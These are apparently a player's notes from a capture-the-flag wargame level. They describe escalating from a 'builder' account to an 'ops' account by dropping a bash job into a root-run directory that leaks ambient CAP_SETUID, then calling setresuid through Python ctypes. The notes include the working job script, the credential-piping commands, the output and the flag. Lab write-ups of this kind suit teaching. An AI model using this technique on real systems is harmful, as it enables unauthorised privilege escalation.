@@ -1,0 +1,128 @@
+goal: become the "ops" service account (uid 1002) and read /var/lib/ops/.flag
+
+start: logged in as ghost2, escalated to deploy via the vault credential
+(rotates every reconnect -- re-read /var/backups/.vault/deploy.secret each
+session), then deploy -> builder via hal-deploy-run (see level2 notes for the
+full stdin-piping technique). All of level3 is done AS BUILDER, reached fresh
+each session via:
+
+  DEPLOY_PW=$(/usr/local/bin/halcyon-backup /var/backups/.vault/deploy.secret | grep -oE 'deploy-[a-z0-9]+')
+  printf '%s\n%s\n' "$DEPLOY_PW" "<builder commands>" | su deploy -c '/usr/local/bin/hal-deploy-run'
+
+kael.txt fragment 3 (read as builder in prior session):
+  Builder can write into the runner's work directory. The runner does not
+  start clean -- its wrapper hands capabilities down to whatever it launches,
+  and it launches whatever you leave in that directory ("ambient capability
+  inheritance"). Read what the wrapper sets before it execs; getpcaps on the
+  running child shows which capability leaked into it. Then get your own code
+  into that child.
+
+recon (as builder):
+  ls -la /opt/hal-runner/            -> drwx-wx--- jobs/, owned builder:builder
+  ls -la /opt/hal-runner/jobs/       -> empty, builder can write (dir is -wx
+                                         for group so builder can create files
+                                         but can't list -- irrelevant, we
+                                         always know our own filenames)
+  cat /src/provision/hal-runner-loop.sh:
+    #!/usr/bin/env bash
+    # runs as root, every 30s execs each job dropped into /opt/hal-runner/jobs
+    # via hal-runner-wrap (which runs it as builder with CAP_SETUID in the
+    # ambient set)
+    JOBS=/opt/hal-runner/jobs
+    while true; do
+      for job in "${JOBS}"/*; do
+        [ -f "${job}" ] && [ -x "${job}" ] || continue
+        /usr/local/bin/hal-runner-wrap "${job}" >/dev/null 2>&1 || true
+      done
+      sleep 30
+    done
+
+  getcap -r / -> /usr/local/bin/hal-runner-wrap cap_setuid=ep (-rwxr-x--- root:root,
+                 builder cannot exec it directly -- only the root loop can invoke it)
+
+  ps -ef | grep hal-runner -> root pid, long-running, confirms the loop is live.
+
+  getent passwd ops builder root:
+    ops:x:1002:1002::/home/ops:/bin/bash
+    builder:x:1001:1001::/home/builder:/bin/bash
+
+  which gcc cc -> nothing on box (no compiler). python3 is present
+  (/usr/bin/python3, 3.10.12) -- used via ctypes to make the setresuid()
+  syscall directly instead of compiling a helper binary.
+
+gotcha #1 -- job must be a plain script, not something exec'd through /usr/bin/env:
+  First attempt was a python3 job with `#!/usr/bin/env python3` shebang,
+  chmod 775 (group-writable). Dropped into jobs/, waited multiple 30s cycles
+  (up to 95s) -- NO effect at all, not even the script's very first,
+  guaranteed-safe file write ran. Fixed the shebang to an absolute path
+  (`#!/usr/bin/python3`) and tightened perms to 700 owned builder -- still
+  silently nothing.
+  Diagnosis: wrote a trivial bash test job instead
+  (`#!/bin/bash; { echo STARTED $(id); cat /proc/self/status | grep -i cap; }
+  >> /home/builder/hal_job_out.txt`), chmod 700. THIS WORKED IMMEDIATELY and
+  showed CapEff/CapAmb = 0000000000000080 (bit 7 = CAP_SETUID) -- confirming
+  the ambient-capability leak exactly as kael described. The python3 job never
+  actually got exec'd by hal-runner-wrap for reasons not fully root-caused
+  (possibly wrap's own execve of the job or its interpreter lookup behaves
+  differently under whatever privilege-drop path it takes for a script
+  invoking /usr/bin/env vs. a bare #!/bin/bash script -- unconfirmed, wrap is
+  unreadable/unexecutable as builder so it can't be inspected directly).
+  Lesson: use a #!/bin/bash job as the outer wrapper (proven to launch
+  reliably), and shell out to `python3 -c`/heredoc *from inside* the bash job
+  for anything that needs libc calls -- the ambient CAP_SETUID is inherited
+  the same way across that nested fork+exec since python3 has no file caps
+  or setuid bit either.
+
+gotcha #2 -- job files are never removed by the loop, it just keeps re-running
+  everything in the directory every 30s forever. Clean up manually
+  (rm the job from /opt/hal-runner/jobs/) once you've captured the output,
+  otherwise it keeps firing indefinitely.
+
+exploit:
+  job dropped into /opt/hal-runner/jobs/ (chmod 700, owned builder):
+
+    #!/bin/bash
+    OUT=/home/builder/hal_job_out.txt
+    {
+      echo "STARTED $(date +%H:%M:%S) $(id)"
+      python3 - <<'PYEOF'
+    import ctypes, os
+    libc = ctypes.CDLL("libc.so.6", use_errno=True)
+    ret = libc.setresuid(1002, 1002, 1002)   # 1002 = ops
+    if ret != 0:
+        print("setresuid failed errno=%d (%s)" % (ctypes.get_errno(), os.strerror(ctypes.get_errno())))
+    else:
+        print("setresuid ok uid=%d gid=%d euid=%d" % (os.getuid(), os.getgid(), os.geteuid()))
+        print("FLAG: " + open("/var/lib/ops/.flag").read().strip())
+        print("dirlist: " + repr(os.listdir("/var/lib/ops")))
+    PYEOF
+    } >> "$OUT" 2>&1
+
+  hal-runner-loop (root) execs it via hal-runner-wrap within 30s. Output:
+
+    STARTED 04:59:04 uid=1001(builder) gid=1001(builder) groups=1001(builder),0(root)
+    setresuid ok uid=1002 gid=1001 euid=1002
+    FLAG: GHS2{559c78ef3d032a3b97d333330c462d10}
+    dirlist: ['kael.txt', '.flag']
+
+  (note: groups includes 0(root) -- hal-runner-wrap adds the root group to the
+  child alongside dropping to builder's uid/gid; didn't end up needing it.
+  gid stays 1001(builder) even after setresuid to ops uid -- only the uid
+  changed since we only called setresuid on uid, not gid. Didn't matter for
+  reading files owned ops:ops with owner-read perms since euid=1002 is what
+  the kernel checks against owner permission bits.)
+
+  Repeated the same technique with a second job to grab /var/lib/ops/kael.txt
+  (readable once uid=1002) for the level4 briefing.
+
+flag: GHS2{559c78ef3d032a3b97d333330c462d10}
+
+--- next up (level4 preview, from kael.txt fragment 4 read as ops) ---
+goal: open /etc/halcyon/deploy/ -- ops itself cannot read it, but a
+capability-bearing helper can.
+hint: getcap again -- find a helper with CAP_DAC_OVERRIDE (ignores file
+permission checks entirely, same style as halcyon-backup in level1 but
+presumably pointed at /etc/halcyon/deploy/ this time -- likely hal-guard,
+which recon in level2/level3 showed as -r-xr-x--- ops:ops cap_dac_override=ep,
+now executable now that we're ops). The brief inside names the next box and
+what credential/material the deploy rides on.
